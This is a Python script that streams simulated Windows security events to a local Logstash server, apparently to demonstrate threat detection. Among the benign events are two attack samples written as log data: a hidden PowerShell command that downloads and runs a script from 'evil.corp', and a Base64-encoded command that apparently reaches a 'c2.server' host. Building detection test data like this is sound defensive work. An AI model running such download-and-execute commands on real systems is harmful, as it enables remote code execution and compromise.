import requests
import json
import time
import random
from datetime import datetime

LOGSTASH_URL = "http://localhost:5001"

# --- DATABASE OF SIMULATED EVENTS ---

# A pool of normal users and processes to make logs look realistic
USERS = ["j.doe", "a.smith", "corp_admin", "svc_account"]
NORMAL_PROCESSES = ["chrome.exe", "WINWORD.EXE", "teams.exe", "explorer.exe", "svchost.exe"]
WORKSTATIONS = ["DESKTOP-A7B2C1", "LAPTOP-Q9R8T7", "DESKTOP-F4G5H6"]


def generate_normal_process_creation():
    """Generates a log for a benign process starting."""
    user = random.choice(USERS)
    process = random.choice(NORMAL_PROCESSES)
    return {
        "EventID": 4688,
        "SourceName": "Microsoft-Windows-Security-Auditing",
        "Message": f"A new process has been created.",
        "ProcessName": f"C:\\Program Files\\...\\{process}",
        "CommandLine": f"\"{process}\" --user={user}",
        "User": user,
        "Workstation": random.choice(WORKSTATIONS)
    }


def generate_user_logon():
    """Generates a log for a user successfully logging on."""
    user = random.choice(USERS)
    return {
        "EventID": 4624,
        "SourceName": "Microsoft-Windows-Security-Auditing",
        "Message": f"An account was successfully logged on. User: {user}",
        "LogonType": 2,  # Interactive Logon
        "User": user,
        "Workstation": random.choice(WORKSTATIONS)
    }


def generate_malicious_invoke_expression():
    """ATTACK: Simulates a fileless malware attack using Invoke-Expression."""
    return {
        "EventID": 4688,
        "SourceName": "Microsoft-Windows-Security-Auditing",
        "Message": "A new process has been created by an attacker.",
        "ProcessName": "powershell.exe",
        "CommandLine": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://evil.corp/payload.ps1'))\"",
        "User": "victim.user",
        "Workstation": "DESKTOP-COMPROMISED"
    }


def generate_malicious_encoded_command():
    """ATTACK: Simulates an obfuscated PowerShell command."""
    # This is a Base64 encoded version of a simple command
    encoded_command = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwBlAHIAdgBlAHIA"
    return {
        "EventID": 4688,
        "SourceName": "Microsoft-Windows-Security-Auditing",
        "Message": "An obfuscated command was executed.",
        "ProcessName": "powershell.exe",
        "CommandLine": f"powershell.exe -EncodedCommand {encoded_command}",
        "User": "victim.user",
        "Workstation": "DESKTOP-COMPROMISED"
    }


# --- THE SIMULATOR ENGINE ---

def run_simulation(total_events=50):
    """Runs the simulation, sending a mix of normal and malicious logs."""

    # Define the "event pool" - mostly normal, some malicious
    event_pool = [
        generate_normal_process_creation,
        generate_user_logon,
        generate_malicious_invoke_expression,  # Our target threat
        generate_malicious_encoded_command  # Another target threat
    ]
    # Define the weights - we want normal events to be much more common
    weights = [0.45, 0.45, 0.05, 0.05]

    print("--- Starting Realistic Log Simulation ---")
    print(f"Sending {total_events} events to Logstash at {LOGSTASH_URL}...")

    for i in range(total_events):
        # Choose an event type based on the defined weights
        event_function = random.choices(event_pool, weights=weights, k=1)[0]

        log_event = event_function()
        log_event["@timestamp"] = datetime.utcnow().isoformat() + "Z"

        is_attack = "malicious" in event_function.__name__

        if is_attack:
            print("\n" + "!" * 60)
            print(f"!!! ({i + 1}/{total_events}) SIMULATING ATTACK: {log_event['CommandLine']}")
            print("!" * 60 + "\n")
        else:
            print(
                f"({i + 1}/{total_events}) Normal activity: {log_event['ProcessName'] if 'ProcessName' in log_event else 'User Logon'}")

        try:
            requests.post(LOGSTASH_URL, json=log_event, timeout=5)
        except requests.exceptions.ConnectionError:
            print("\n!!! FATAL CONNECTION ERROR !!!")
            print(
                "Could not connect to Logstash. Please ensure the ELK stack is running and configured for a live demo.")
            return
        except Exception as e:
            print(f"\nAn unexpected error occurred: {e}")
            return

        # Add a random delay to make the stream feel more natural
        time.sleep(0.5)

    print("\n--- Simulation Complete ---")


if __name__ == "__main__":
    run_simulation()
